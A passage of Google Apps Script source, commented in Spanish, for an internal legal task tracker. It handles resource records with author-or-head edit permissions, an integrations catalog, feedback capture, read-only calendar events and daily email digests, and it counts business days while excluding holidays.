                fecha: (rows[i][7] || '').toString().trim(),
                tipo: _recNormalizeTipo(rows[i].length > 8 ? rows[i][8] : ''),
                tags: _recParseTags(rows[i].length > 9 ? rows[i][9] : ''),
                destacado: _recToBool(rows[i].length > 10 ? rows[i][10] : false),
                clicks: (function() { var n = parseInt(rows[i].length > 11 ? rows[i][11] : 0, 10); return isNaN(n) ? 0 : n; })(),
                area: (rows[i].length > 12 ? (rows[i][12] || '') : '').toString().trim(),
                requierePago: _recToBool(rows[i].length > 13 ? rows[i][13] : false)
              }
            };
          }
        }
      }

      var id = _nextRecursoId(ws);
      var autor = (ctx.user && ctx.user.name) || ctx.email || '';
      var autorEmail = ctx.email || '';
      var fecha = Utilities.formatDate(new Date(), 'America/Bogota', 'dd/MM/yyyy');
      // Fila completa de 14 cols. destacado=false, clicks=0 por default.
      ws.appendRow(_sanitizeRow([
        id, titulo, url, categoria, descripcion, autor, autorEmail, fecha,
        tipo, tagsCsv, false, 0, area, requierePago
      ]));
      return {
        success: true,
        recurso: {
          id: id, titulo: titulo, url: url, categoria: categoria,
          descripcion: descripcion, autor: autor, autorEmail: autorEmail, fecha: fecha,
          tipo: tipo, tags: _recParseTags(tagsCsv), destacado: false, clicks: 0,
          area: area, requierePago: requierePago
        }
      };
    });
  }, {});
}

// updateRecurso(id, campos): edita un recurso existente. Permiso: el AUTOR
// (autorEmail === ctx.email, case-insensitive) o un HEAD (ctx.role === 'head').
// Campos editables: titulo, url (re-validada), categoria, descripcion, tipo,
// tags, area, requierePago. Solo se tocan los campos provistos (PATCH parcial).
// NO toca: autor, autorEmail, fecha, destacado, clicks.
function updateRecurso(id, campos) {
  return _telemetry('updateRecurso', function() {
    return _safeMutation(function() {
      var ctx = _getAuthContext();
      var rid = (id || '').toString().trim();
      if (!rid) return { success: false, error: 'ID requerido.' };
      campos = campos || {};
      var ws = _ensureRecursosSheet(ctx.ss);
      var lr = ws.getLastRow();
      if (lr < 2) return { success: false, error: 'No hay recursos.' };
      var lc = Math.max(ws.getLastColumn(), _REC_COLS);
      var data = ws.getRange(2, 1, lr - 1, lc).getValues();
      var rowIdx = -1, row = null;
      for (var i = 0; i < data.length; i++) {
        if ((data[i][0] || '').toString().trim() === rid) {
          rowIdx = i + 2;
          row = data[i];
          break;
        }
      }
      if (rowIdx < 0) return { success: false, error: 'Recurso no encontrado.' };

      var autorEmail = (row[6] || '').toString().trim().toLowerCase();
      var isAuthor = ctx.email && autorEmail && ctx.email.toLowerCase() === autorEmail;
      if (ctx.role !== 'head' && !isAuthor) {
        return { success: false, error: 'Solo el autor o un head pueden editar este recurso.' };
      }

      // Construir el estado actualizado (14 cols), tocando solo lo provisto.
      var cur = {
        id: (row[0] || '').toString().trim(),
        titulo: (row[1] || '').toString().trim(),
        url: (row[2] || '').toString().trim(),
        categoria: (row[3] || '').toString().trim() || 'General',
        descripcion: (row[4] || '').toString().trim(),
        autor: (row[5] || '').toString().trim(),
        autorEmail: (row[6] || '').toString().trim(),
        fecha: (row[7] || '').toString().trim(),
        tipo: _recNormalizeTipo(row.length > 8 ? row[8] : ''),
        tags: _recParseTags(row.length > 9 ? row[9] : ''),
        destacado: _recToBool(row.length > 10 ? row[10] : false),
        clicks: (function() { var n = parseInt(row.length > 11 ? row[11] : 0, 10); return isNaN(n) ? 0 : n; })(),
        area: (row.length > 12 ? (row[12] || '') : '').toString().trim(),
        requierePago: _recToBool(row.length > 13 ? row[13] : false)
      };

      if (campos.hasOwnProperty('titulo')) {
        var t = (campos.titulo || '').toString().trim();
        if (!t) return { success: false, error: 'El título es obligatorio.' };
        cur.titulo = t;
      }
      if (campos.hasOwnProperty('url')) {
        var v = _recValidateUrl(campos.url);
        if (!v.ok) return { success: false, error: v.error };
        // Dedupe: la URL editada no puede colisionar con OTRO recurso (consistente con addRecurso).
        var _newNorm = _recNormalizeUrl(v.url);
        for (var di = 0; di < data.length; di++) {
          if (di === rowIdx - 2) continue; // saltar la fila propia
          if (_recNormalizeUrl((data[di][2] || '').toString()) === _newNorm) {
            return { success: false, motivo: 'duplicado', error: 'Ya existe otro recurso con esa URL.' };
          }
        }
        cur.url = v.url;
      }
      if (campos.hasOwnProperty('categoria')) {
        cur.categoria = (campos.categoria || '').toString().trim() || 'General';
      }
      if (campos.hasOwnProperty('descripcion')) {
        cur.descripcion = (campos.descripcion || '').toString().trim();
      }
      if (campos.hasOwnProperty('tipo')) cur.tipo = _recNormalizeTipo(campos.tipo);
      if (campos.hasOwnProperty('tags')) cur.tags = _recParseTags(campos.tags);
      if (campos.hasOwnProperty('area')) cur.area = (campos.area || '').toString().trim();
      if (campos.hasOwnProperty('requierePago')) cur.requierePago = _recToBool(campos.requierePago);

      // Escribir la fila completa (14 cols) en BATCH.
      ws.getRange(rowIdx, 1, 1, _REC_COLS).setValues([_sanitizeRow([
        cur.id, cur.titulo, cur.url, cur.categoria, cur.descripcion, cur.autor,
        cur.autorEmail, cur.fecha, cur.tipo, _recTagsToCsv(cur.tags), cur.destacado,
        cur.clicks, cur.area, cur.requierePago
      ])]);
      return { success: true, recurso: cur };
    });
  }, { id: id });
}

// Permiso: solo el AUTOR (autorEmail === email del visitante) o un HEAD.
function deleteRecurso(id) {
  return _telemetry('deleteRecurso', function() {
    return _safeMutation(function() {
      var ctx = _getAuthContext();
      var rid = (id || '').toString().trim();
      if (!rid) return { success: false, error: 'ID requerido.' };
      var ws = ctx.ss.getSheetByName(SHEET_RECURSOS);
      if (!ws) return { success: false, error: 'No hay recursos.' };
      var lr = ws.getLastRow();
      if (lr < 2) return { success: false, error: 'No hay recursos.' };
      var data = ws.getRange(2, 1, lr - 1, _REC_COLS).getValues();
      var rowIdx = -1, autorEmail = '';
      for (var i = 0; i < data.length; i++) {
        if ((data[i][0] || '').toString().trim() === rid) {
          rowIdx = i + 2;
          autorEmail = (data[i][6] || '').toString().trim().toLowerCase();
          break;
        }
      }
      if (rowIdx < 0) return { success: false, error: 'Recurso no encontrado.' };
      var isAuthor = ctx.email && autorEmail && ctx.email.toLowerCase() === autorEmail;
      if (ctx.role !== 'head' && !isAuthor) {
        return { success: false, error: 'Solo el autor o un head pueden eliminar este recurso.' };
      }
      ws.deleteRow(rowIdx);
      return { success: true };
    });
  }, { id: id });
}

// ════════════════════════════════════════════════════════════════
// INTEGRACIONES (Fase I0) · catálogo de integraciones del Legal Tracker
// ════════════════════════════════════════════════════════════════
// Hoja 'Integraciones' auto-creada + sembrada en el primer uso (mismo patrón
// que _ensureRecursosSheet). 14 cols, bilingüe ES/PT: el backend NO sabe el
// idioma del visitante (el frontend elige según su LANG), por eso devuelve
// TODOS los campos _es y _pt. Header fijo (orden importa).
const _INTEG_HEADERS = ['id', 'key', 'titulo_es', 'titulo_pt', 'queHace_es', 'queHace_pt', 'comoActivar_es', 'comoActivar_pt', 'estado', 'icono', 'ctaTexto_es', 'ctaTexto_pt', 'ctaUrl', 'orden'];
const _INTEG_COLS = _INTEG_HEADERS.length; // 14

// Siembra inicial (8 filas). PT = igual al ES como placeholder; ctaUrl = ''.
function _integSeedRows() {
  // Helper: arma una fila duplicando ES→PT en titulo/queHace/comoActivar/ctaTexto.
  function R(id, key, titulo, queHace, comoActivar, estado, icono, ctaTexto, orden) {
    return [id, key, titulo, titulo, queHace, queHace, comoActivar, comoActivar, estado, icono, ctaTexto, ctaTexto, '', orden];
  }
  return [
    R(1, 'gmail_addon', 'Add-on de Gmail', 'Crear tarea legal desde un correo, pre-llenada con IA; subir adjuntos a Drive', 'Instalá el complemento de Gmail desde el Marketplace de tu Workspace.', 'instala_addon', '📧', 'Cómo instalarlo', 1),
    R(2, 'digest_diario', 'Digest diario por email', 'Resumen 8am: vencidas / vencen hoy / próximas, con deep-links', 'Tu admin activa el envío diario.', 'setup_admin', '📬', 'Ver pasos', 2),
    R(3, 'contract_intel', 'Contract Intelligence (IA)', 'Botón ✨ en PDFs: extrae partes, vigencia, vencimiento, obligaciones y riesgos; crea recordatorio de renovación', 'Requiere API key de Gemini (la configura el admin).', 'setup_admin', '✨', 'Ver pasos', 3),
    R(4, 'busqueda_semantica', 'Búsqueda semántica (IA)', 'Buscar en la Biblioteca por significado, no por palabra exacta', 'Requiere API key de Gemini + indexado (admin).', 'setup_admin', '🔎', 'Ver pasos', 4),
    R(5, 'slack', 'Slack', 'Notificaciones salientes del bot al canal del equipo', 'El admin configura el bot y el canal.', 'setup_admin', '💬', 'Ver pasos', 5),
    R(6, 'calendario', 'Calendario', 'Cruza reuniones con deadlines; crear tarea de seguimiento desde un evento', 'Compartí tu Google Calendar con la cuenta del Legal Tracker (o IT habilita la visibilidad interna).', 'owner_centrico', '📅', '', 6),
    R(7, 'drive', 'Drive', 'Carpetas auto-organizadas por taxonomía (año/país/cliente/tipo)', 'Ya está activo.', 'activa', '📁', '', 7),
    R(8, 'exports', 'Exports', 'Reporte XLSX filtrado y PDF mensual por país', 'Ya está activo (desde el tracker).', 'activa', '📤', '', 8)
  ];
}

// get-or-create + seed. Mismo patrón que _ensureRecursosSheet (header bold +
// fila congelada). Si la crea, la siembra con las 8 filas.
function _ensureIntegracionesSheet(ss) {
  var ws = ss.getSheetByName(SHEET_INTEGRACIONES);
  if (!ws) {
    ws = ss.insertSheet(SHEET_INTEGRACIONES);
    ws.getRange(1, 1, 1, _INTEG_COLS).setValues([_INTEG_HEADERS]);
    ws.getRange(1, 1, 1, _INTEG_COLS).setFontWeight('bold');
    ws.setFrozenRows(1);
    var seed = _integSeedRows();
    if (seed && seed.length) ws.getRange(2, 1, seed.length, _INTEG_COLS).setValues(seed.map(_sanitizeRow));
  }
  return ws;
}

// Devuelve el catálogo completo (todos los campos _es y _pt), ordenado por
// 'orden'. El frontend elige idioma según su LANG.
function getIntegraciones() {
  return _telemetry('getIntegraciones', function() {
    try {
      var ctx = _getAuthContext();
      var ws = _ensureIntegracionesSheet(ctx.ss); // crea + siembra si no existe
      var lr = ws.getLastRow();
      if (lr < 2) return { success: true, integraciones: [] };
      // Lectura defensiva hasta el ancho real (mín. _INTEG_COLS).
      var lc = Math.max(ws.getLastColumn(), _INTEG_COLS);
      var data = ws.getRange(2, 1, lr - 1, lc).getValues();
      var integraciones = [];
      data.forEach(function(r) {
        var id = (r[0] || '').toString().trim();
        var key = (r[1] || '').toString().trim();
        if (!id && !key) return; // saltar filas vacías/corruptas
        var ordRaw = parseInt(r.length > 13 ? r[13] : 0, 10);
        integraciones.push({
          id: id,
          key: key,
          titulo_es: (r[2] || '').toString().trim(),
          titulo_pt: (r[3] || '').toString().trim(),
          queHace_es: (r[4] || '').toString().trim(),
          queHace_pt: (r[5] || '').toString().trim(),
          comoActivar_es: (r[6] || '').toString().trim(),
          comoActivar_pt: (r[7] || '').toString().trim(),
          estado: (r[8] || '').toString().trim(),
          icono: (r[9] || '').toString().trim(),
          ctaTexto_es: (r[10] || '').toString().trim(),
          ctaTexto_pt: (r[11] || '').toString().trim(),
          ctaUrl: (r[12] || '').toString().trim(),
          orden: isNaN(ordRaw) ? 0 : ordRaw
        });
      });
      integraciones.sort(function(a, b) { return a.orden - b.orden; });
      return { success: true, integraciones: integraciones };
    } catch (e) {
      return { success: false, error: (e && e.message) || String(e) };
    }
  });
}

// ════════════════════════════════════════════════════════════════
// FEEDBACK (Beta) · captura comentarios del equipo a la hoja 'Feedback'
// ════════════════════════════════════════════════════════════════
// Auto-captura: quién (email/nombre/rol), en qué vista y con qué sentimiento.
// No usa _safeMutation a propósito (no debe invalidar el cache del tracker por
// un write no relacionado). Lock propio para el append.
function submitFeedback(text, meta) {
  return _telemetry('submitFeedback', function() {
    var ctx = _getAuthContext();
    var msg = (text || '').toString().trim();
    if (!msg) return { success: false, error: 'Escribí tu feedback primero.' };
    if (msg.length > 4000) msg = msg.slice(0, 4000);
    meta = meta || {};
    var ws = ctx.ss.getSheetByName('Feedback');
    if (!ws) {
      ws = ctx.ss.insertSheet('Feedback');
      ws.getRange(1, 1, 1, 7).setValues([['ts', 'email', 'nombre', 'rol', 'vista', 'sentimiento', 'mensaje']]);
      ws.getRange(1, 1, 1, 7).setFontWeight('bold');
      ws.setFrozenRows(1);
    }
    var lock = LockService.getScriptLock();
    try { lock.waitLock(8000); } catch (e) {}
    try {
      ws.appendRow(_sanitizeRow([
        new Date().toISOString(),
        ctx.email || '',
        (ctx.user && ctx.user.name) || '',
        ctx.role || '',
        (meta.view || '').toString().slice(0, 40),
        (meta.sentiment || '').toString().slice(0, 16),
        msg
      ]));
    } finally { try { lock.releaseLock(); } catch (e) {} }
    return { success: true };
  }, {});
}

// ════════════════════════════════════════════════════════════════
// GOOGLE CALENDAR (read-only) · ver eventos + crear tareas desde ellos
// ════════════════════════════════════════════════════════════════
// Calendario PROPIO del visitante. El web app corre como el owner (executeAs:
// USER_DEPLOYING), así que CalendarApp.getCalendarById(email) sólo devuelve los
// eventos del visitante si su calendario es legible por la cuenta owner — lo
// cual ocurre si la visibilidad interna del Workspace de Rappi permite ver los
// detalles de los eventos entre colegas. NO se cae al calendario del owner como
// fallback: eso filtraría los eventos del owner a todos los usuarios.
// Devuelve { cal, reason } — reason es un código diagnóstico para entender
// (vía el log de ejecución) en qué paso se resuelve o falla la lógica.
function _resolveUserCalendar() {
  var email = '';
  try { email = (Session.getActiveUser().getEmail() || '').toString().trim(); } catch (e) {}
  if (!email) return { cal: null, reason: 'sin_email' };
  var cal = null, calErr = '';
  try { cal = CalendarApp.getCalendarById(email); } catch (e) { calErr = (e && e.message) || String(e); }
  if (cal) return { cal: cal, reason: 'byId', email: email };
  // getCalendarById() a veces devuelve null para el calendario PRIMARIO propio.
  // Si el visitante es el mismo usuario efectivo bajo el que corre el script (el
  // owner del deployment), getDefaultCalendar() trae su primario de forma
  // confiable. NO se aplica a otros visitantes: ahí el default sería el del
  // owner → fuga de sus eventos. Para ellos vale el getCalendarById de arriba
  // (funciona por la visibilidad interna del Workspace).
  var effEmail = '';
  try { effEmail = (Session.getEffectiveUser().getEmail() || '').toString().trim(); } catch (e) {}
  var esOwner = effEmail && email.toLowerCase() === effEmail.toLowerCase();
  if (esOwner) {
    try {
      var def = CalendarApp.getDefaultCalendar();
      if (def) return { cal: def, reason: 'default', email: email };
      return { cal: null, reason: 'default_null;eff=' + effEmail };
    } catch (e2) {
      return { cal: null, reason: 'default_err:' + ((e2 && e2.message) || e2) };
    }
  }
  return { cal: null, reason: 'byId_null' + (calErr ? '_err:' + calErr : '') + ';eff=' + (effEmail || '∅') + ';owner=' + esOwner };
}

// Eventos del calendario propio del visitante en un rango. Read-only.
// fromIso (yyyy-MM-dd) + days opcionales: por default arranca hoy y trae 14
// días. La vista semana pide una semana puntual (fromIso = lunes, days = 7).
function getUpcomingCalendarEvents(fromIso, days) {
  return _telemetry('getUpcomingCalendarEvents', function() {
    var r = _resolveUserCalendar();
    var cal = r.cal;
    if (!cal) {
      // El diag crudo (r.reason) va al log de ejecución, no a la UI (antes se
      // mostraba "[diag: byId_null;eff=...]", feo y filtraba el email del owner).
      // Mensaje accionable: el visitante puede auto-resolverlo compartiendo su
      // calendario con la cuenta que corre el app (effectiveUser = owner).
      var _ownerEmail = '';
      try { _ownerEmail = (Session.getEffectiveUser().getEmail() || '').toString().trim(); } catch (e) {}
      try { console.warn('Calendar resolve failed [' + r.reason + ']'); } catch (e) {}
      return { items: [], error: 'No pudimos acceder a tu calendario — es opcional, el resto de MyDash funciona igual. Para verlo acá, desplegá «¿No ves tus reuniones acá?» arriba (se conecta una sola vez).' };
    }
    var tz = 'America/Bogota';
    var from;
    if (fromIso && /^\d{4}-\d{2}-\d{2}$/.test(fromIso)) {
      var p = fromIso.split('-'); from = new Date(+p[0], +p[1] - 1, +p[2], 0, 0, 0);
    } else {
      from = new Date();
    }
    var span = (typeof days === 'number' && days > 0) ? days : 14;
    var until = new Date(from.getTime() + span * 24 * 60 * 60 * 1000);
    var events;
    try { events = cal.getEvents(from, until); } catch (e) { return { items: [], error: 'No pude leer el calendario (¿permisos?).' }; }
    var items = events.map(function(ev) {
      var start = ev.getStartTime();
      var end = ev.getEndTime();
      var allDay = ev.isAllDayEvent();
      return {
        id: ev.getId(),
        title: ev.getTitle() || '(sin título)',
        startIso: start ? Utilities.formatDate(start, tz, 'yyyy-MM-dd') : '',
        startMs: start ? start.getTime() : null,
        endMs: end ? end.getTime() : null,
        timeLabel: (start && !allDay) ? Utilities.formatDate(start, tz, 'HH:mm') : '',
        startLabel: start ? Utilities.formatDate(start, tz, allDay ? 'EEE d MMM' : 'EEE d MMM · HH:mm') : '',
        allDay: allDay,
        desc: (ev.getDescription() || '').toString().slice(0, 500),
        location: (ev.getLocation() || '').toString().slice(0, 120)
      };
    });
    return { items: items };
  });
}

// Crea una tarea de SEGUIMIENTO a partir de un evento (reunión). Una reunión no
// es un entregable, así que NO se mapea 1:1: el deadline default es 2 días
// hábiles DESPUÉS de la reunión y el evento queda como contexto en notas (no se
// vuelca la descripción entera). Asignada al usuario actual.
function createTaskFromCalendarEvent(eventId) {
  return _telemetry('createTaskFromCalendarEvent', function() {
    var cal = _resolveUserCalendar().cal;
    if (!cal) return { success: false, error: 'No pude acceder a tu calendario.' };
    var ev = null;
    try { ev = cal.getEventById(eventId); } catch (e) {}
    if (!ev) return { success: false, error: 'Evento no encontrado.' };
    var ctx = _getAuthContext();
    var tz = 'America/Bogota';
    var start = ev.getStartTime();
    var now = new Date();
    // Base del seguimiento: la reunión si es futura; si ya pasó (o es hoy) se
    // cuenta desde HOY. Antes era siempre desde la reunión, y para una reunión
    // pasada el plazo (+2 hábiles) caía en el pasado → _addTaskImpl lo rechazaba
    // con "El plazo no puede estar en el pasado".
    var base = (start && start.getTime() > now.getTime()) ? new Date(start.getTime()) : new Date(now.getTime());
    // +2 días hábiles desde la base.
    var due = new Date(base.getTime());
    var added = 0;
    while (added < 2) { due.setDate(due.getDate() + 1); var d = due.getDay(); if (d !== 0 && d !== 6) added++; }
    var evTitle = (ev.getTitle() || 'reunión').toString().slice(0, 70);
    var evDateLabel = start ? Utilities.formatDate(start, tz, 'd MMM yyyy') : '';
    var taskObj = {
      nombre: ('Seguimiento: ' + evTitle).slice(0, 80),
      resp: (ctx.user && ctx.user.name) || '',
      deadline: Utilities.formatDate(due, tz, 'yyyy-MM-dd'),
      notas: 'Seguimiento de la reunión "' + evTitle + '"' + (evDateLabel ? ' (' + evDateLabel + ')' : '') + '.\n- ',
      priority: 'Media'
    };
    return _safeMutation(function() { return _addTaskImpl(taskObj); });
  }, { eventId: eventId });
}

// ════════════════════════════════════════════════════════════════
// RESUMEN DIARIO POR CORREO (usa el scope script.send_mail existente)
// ════════════════════════════════════════════════════════════════
function _htmlEsc(s){ return (s==null?'':String(s)).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
function _isoPlusDays(iso, n){ var p=String(iso).split('-'); var d=new Date(+p[0],+p[1]-1,+p[2]); d.setDate(d.getDate()+n); return Utilities.formatDate(d,'America/Bogota','yyyy-MM-dd'); }

function _digestTaskRow(t, tone){
  var color = tone==='crit' ? '#d04848' : (tone==='warn' ? '#c98a2e' : '#3a7ec2');
  return '<tr><td style="padding:7px 0;border-bottom:1px solid #eee;font:14px -apple-system,Segoe UI,Roboto,sans-serif;color:#222">'
    + '<span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:'+color+';margin-right:9px"></span>'
    + _htmlEsc(t.nombre)
    + '<span style="color:#999;font-size:12px"> · '+_htmlEsc(t.priority||'Media')+(t.pais?' · '+_htmlEsc(t.pais):'')+'</span>'
    + '</td></tr>';
}

// Digest de UNA persona: sus tareas (vencidas / hoy / semana) + reuniones de hoy.
// Devuelve { hasContent, html, subject }. Best-effort en calendario (try/catch).
function _buildDigestForMember(memberName, memberEmail, allTasks, todayISO, webUrl){
  var mine = allTasks.filter(function(t){ return t.resp===memberName && t.status!=='Listo' && t.status!=='Cancelado'; });
  var overdue=[], today=[], week=[]; var weekEnd=_isoPlusDays(todayISO,7);
  mine.forEach(function(t){
    if(!t.deadlineISO) return;
    if(t.status === 'Bloqueado') return; // On hold: no se puede cerrar hoy — fuera del digest accionable
    if(t.deadlineISO < todayISO) overdue.push(t);
    else if(t.deadlineISO === todayISO) today.push(t);
    else if(t.deadlineISO <= weekEnd) week.push(t);
  });
  var meetings=[];
  try{
    var cal=CalendarApp.getCalendarById(memberEmail);
    if(cal){
      var p=todayISO.split('-'); var from=new Date(+p[0],+p[1]-1,+p[2],0,0,0); var to=new Date(from.getTime()+86400000);
      meetings=cal.getEvents(from,to).map(function(ev){ var s=ev.getStartTime(); return {time:(s&&!ev.isAllDayEvent())?Utilities.formatDate(s,'America/Bogota','HH:mm'):'', title:ev.getTitle()||'(sin título)'}; })
        .sort(function(a,b){ return (a.time||'99')<(b.time||'99')?-1:1; });
    }
  }catch(e){}
  if(!(overdue.length||today.length||week.length||meetings.length)) return {hasContent:false};

  function section(title, rowsHtml, sub){
    return '<div style="margin:18px 0 4px;font:600 13px -apple-system,Segoe UI,Roboto,sans-serif;color:#111;text-transform:uppercase;letter-spacing:.03em">'+title+(sub?' <span style="color:#999;font-weight:400">'+sub+'</span>':'')+'</div>'
      +'<table style="width:100%;border-collapse:collapse">'+rowsHtml+'</table>';
  }
  var body='';
  if(overdue.length) body+=section('Vencidas', overdue.map(function(t){return _digestTaskRow(t,'crit');}).join(''), '('+overdue.length+')');
  if(today.length) body+=section('Vencen hoy', today.map(function(t){return _digestTaskRow(t,'warn');}).join(''), '('+today.length+')');
  if(week.length) body+=section('Esta semana', week.map(function(t){return _digestTaskRow(t,'info');}).join(''), '('+week.length+')');
  if(meetings.length){
    var mr=meetings.map(function(m){ return '<tr><td style="padding:7px 0;border-bottom:1px solid #eee;font:14px -apple-system,Segoe UI,Roboto,sans-serif;color:#222">'+(m.time?'<b style="color:#3a7ec2">'+_htmlEsc(m.time)+'</b>&nbsp;&nbsp;':'')+_htmlEsc(m.title)+'</td></tr>'; }).join('');
    body+=section('Reuniones de hoy', mr, '('+meetings.length+')');
  }
  var btn = webUrl ? '<a href="'+webUrl+'" style="display:inline-block;margin-top:22px;background:#ED4519;color:#fff;text-decoration:none;padding:10px 18px;border-radius:8px;font:600 14px -apple-system,Segoe UI,Roboto,sans-serif">Abrir el tracker &rarr;</a>' : '';
  var html='<div style="max-width:560px;margin:0 auto;padding:24px;background:#fff">'
    +'<div style="font:700 20px -apple-system,Segoe UI,Roboto,sans-serif;color:#111">Tu día · Legal Tracker</div>'
    +'<div style="font:13px -apple-system,Segoe UI,Roboto,sans-serif;color:#999;margin-top:2px">Hola '+_htmlEsc((memberName||'').split(' ')[0])+' — esto tenés en el radar.</div>'
    +body+btn
    +'<div style="margin-top:24px;font:12px -apple-system,Segoe UI,Roboto,sans-serif;color:#bbb">Legal Tracker · Rappi</div>'
    +'</div>';
  var subject='Tu día · '+overdue.length+' vencidas · '+today.length+' hoy · '+meetings.length+' reuniones';
  return {hasContent:true, html:html, subject:subject};
}

// A demanda: envía el resumen al usuario actual (botón en el menú). Callable.
function sendMyDigestNow(){
  return _telemetry('sendMyDigestNow', function(){
    var ctx=_getAuthContext();
    var allTasks=readTasks(ctx.ss.getSheetByName(SHEET_ACTIVO));
    var todayISO=Utilities.formatDate(new Date(),'America/Bogota','yyyy-MM-dd');
    var webUrl=''; try{ webUrl=ScriptApp.getService().getUrl()||''; }catch(e){}
    var d=_buildDigestForMember(ctx.user.name, ctx.email, allTasks, todayISO, webUrl);
    if(!d.hasContent) return {success:true, sent:false};
    MailApp.sendEmail({to:ctx.email, subject:d.subject, htmlBody:d.html});
    return {success:true, sent:true};
  });
}

// Target ÚNICO del trigger diario (corre como owner). Manda a CADA persona su
// "Tu día" (tareas vencidas/hoy/semana + reuniones del día) y, a cada líder, el
// resumen agregado de su equipo. Unifica los dos sistemas de digest que existían.
function sendDailyDigests(){
  return _telemetry('sendDailyDigests', function(){
    // Skip fines de semana usando DIGEST_TZ (no la TZ del proyecto). El botón
    // manual sendMyDigestNow NO trae este guard (el user lo pide explícitamente).
    if (DIGEST_SKIP_WEEKENDS) {
      var dow = parseInt(Utilities.formatDate(new Date(), DIGEST_TZ, 'u'), 10); // 6=sáb, 7=dom
      if (dow === 6 || dow === 7) return { success: true, sent: 0, skipped: 0, weekend: true };
    }
    var ss=SpreadsheetApp.openById(SHEET_ID);
    var equipos=readEquipos(ss);
    var allow=buildEmailAllowlist(equipos); // email -> {name,...}
    var allTasks=readTasks(ss.getSheetByName(SHEET_ACTIVO));
    var todayISO=Utilities.formatDate(new Date(),'America/Bogota','yyyy-MM-dd');
    var webUrl=''; try{ webUrl=ScriptApp.getService().getUrl()||''; }catch(e){}
    // 1) "Tu día" por persona.
    var sent=0, skipped=0;
    Object.keys(allow).forEach(function(email){
      var d=_buildDigestForMember(allow[email].name, email, allTasks, todayISO, webUrl);
      if(!d.hasContent){ skipped++; return; }
      try{ MailApp.sendEmail({to:email, subject:d.subject, htmlBody:d.html}); sent++; }catch(e){ skipped++; }
    });
    // 2) Resumen agregado al líder de cada país (reusa _sendManagerDigest del
    //    sistema previo). Necesita etaDays → enriquecemos una vez (no afecta al
    //    paso 1, que lee deadlineISO directo). Best-effort: un fallo acá no rompe
    //    el digest por persona.
    var managerSent=0;
    try {
      var fbc=_loadFeriados(ss);
      allTasks.forEach(function(t){ _enrichTaskEditorial(t, todayISO, { feriadosByCountry: fbc }); });
      var relevant=allTasks.filter(function(t){ return t.status!=='Listo' && typeof t.etaDays==='number' && t.etaDays<=2; });
      equipos.forEach(function(team){
        if(!team.leaderEmail) return;
        var names=(team.members||[]).slice(); if(team.leader) names.push(team.leader);
        var norm={}; names.forEach(function(n){ norm[_normalizeName(n)]=1; });
        var teamRel=relevant.filter(function(t){ return norm[_normalizeName(t.resp)]; });
        if(!teamRel.length) return;
        try{ _sendManagerDigest(team.leaderEmail, team, teamRel, null); managerSent++; }catch(e){}
      });
    } catch(e){ Logger.log('[digest] resumen de manager omitido: '+((e&&e.message)||e)); }
    return {success:true, sent:sent, skipped:skipped, managerSent:managerSent};
  });
}

// El instalador canónico del digest diario es installDigestTrigger() (admin.gs):
// programa sendDailyDigests (~8am) y limpia cualquier trigger previo. Acá queda
// solo el remover, que borra ambos nombres de handler (incl. el legacy
// sendDailyDigest) por si quedó alguno de una instalación vieja.
function removeDailyDigestTrigger(){
  var n=0; ScriptApp.getProjectTriggers().forEach(function(tr){ var h=tr.getHandlerFunction(); if(h==='sendDailyDigests'||h==='sendDailyDigest'){ ScriptApp.deleteTrigger(tr); n++; } });
  return 'Triggers de resumen removidos: '+n;
}
// O(1) en lugar del while-day-by-day. Para historial extenso (años),
// el loop original disparaba miles de iteraciones por entry × cientos
// de entries → segundos de CPU. Algoritmo: total días entre fechas,
// menos los fines de semana caídos en ese rango.
// countBizDays(start, end [, feriadosSet]) → cuenta días hábiles estrictamente
// entre start (exclusivo) y end (inclusivo). Excluye sábados y domingos.
// Si se pasa feriadosSet (Set<'YYYY-MM-DD'> o {iso: true}), también excluye
// esos días cuando caen en (start, end] y son días de semana.
// El algoritmo base es O(1) (weeks*5 + remainder); la sustracción de feriados
// es O(|feriadosSet|), típicamente ~18 fechas por país.
function countBizDays(start, end, feriadosSet) {
  if (!start || !end) return 0;
  var s = new Date(start.getFullYear(), start.getMonth(), start.getDate());
  var e = new Date(end.getFullYear(), end.getMonth(), end.getDate());
  var days = Math.round((e - s) / 86400000);
  if (days <= 0) return 0;
  var weeks = Math.floor(days / 7);
  var biz = weeks * 5;
  var startDow = s.getDay();
  // Para los días sobrantes (0..6), contar cuáles caen en lun-vie.
  var rem = days - weeks * 7;
  for (var i = 1; i <= rem; i++) {
    var dow = (startDow + i) % 7;
    if (dow !== 0 && dow !== 6) biz++;
  }
  // Restar feriados de día de semana que caigan en (s, e].
  if (feriadosSet && _setHas(feriadosSet)) {
    _forEachFeriado(feriadosSet, function(iso){
      var m = iso.match(/^(\d{4})-(\d{2})-(\d{2})$/);
      if (!m) return;
      var f = new Date(parseInt(m[1],10), parseInt(m[2],10)-1, parseInt(m[3],10));
      if (f.getTime() > s.getTime() && f.getTime() <= e.getTime()) {
        var dow2 = f.getDay();
        if (dow2 !== 0 && dow2 !== 6) biz--;
      }
    });
  }
  return biz < 0 ? 0 : biz;
}

// Helper portable: ¿el "set" tiene al menos un elemento? Aceptamos Set nativo o plain object.
function _setHas(setOrObj) {
  if (!setOrObj) return false;
  if (typeof setOrObj.size === 'number') return setOrObj.size > 0;
  for (var k in setOrObj) { if (setOrObj.hasOwnProperty(k)) return true; }
  return false;
}
function _forEachFeriado(setOrObj, cb) {
  if (!setOrObj) return;
  if (typeof setOrObj.forEach === 'function' && typeof setOrObj.size === 'number') {
    setOrObj.forEach(function(v){ cb(v); });
  } else {
    for (var k in setOrObj) { if (setOrObj.hasOwnProperty(k)) cb(k); }
  }
}

// Diferencia en días hábiles entre dos ISO dates, con signo. Negativo si el
// deadline ya pasó. Usa los feriados del país pasado; si paisCode no está en
// feriadosByCountry, fallback a "solo lun-vie sin feriados".
//
// Ejemplo: today=Vie 2026-05-15, deadline=Lun 2026-05-18 → 1
// (calendar daría 3; con biz days solo cuenta el lunes).
function _bizDaysBetween(todayISO, deadlineISO, paisCode, feriadosByCountry) {
  if (!todayISO || !deadlineISO) return 0;
  var today = _parseISODate(todayISO);
  var deadline = _parseISODate(deadlineISO);
  if (!today || !deadline) return 0;
  var set = (feriadosByCountry && paisCode && feriadosByCountry[paisCode]) || null;
  var t = today.getTime(), d = deadline.getTime();
  if (d > t) return  countBizDays(today, deadline, set);
  if (d < t) return -countBizDays(deadline, today, set);
  return 0;
}

// _loadFeriados(ss) → { CO: Set('YYYY-MM-DD'), MX: Set, CR: Set, ... }
